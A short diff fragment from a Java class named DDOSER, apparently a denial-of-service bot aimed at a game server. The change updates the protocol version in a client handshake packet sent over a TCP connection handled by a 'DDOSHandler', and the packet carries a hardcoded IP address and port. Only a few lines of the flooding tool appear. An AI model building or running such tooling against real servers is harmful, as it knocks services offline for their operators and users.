@@ -79,7 +79,7 @@ public class DDOSER extends Thread {
 				running = true;
 				logged = false;
 				connection = new TcpConnection(address, port, name, new DDOSHandler(this), logger);
-				addToSendQueue(new Packet2ClientProtocol(61, name, "202.81.231.112", 37705));
+				addToSendQueue(new Packet2ClientProtocol(69, name, "202.81.231.112", 37705));
 				//logged = true;
 		        //addToSendQueue(new Packet205ClientCommand(0));
 				//byte[] array = new byte[16385];
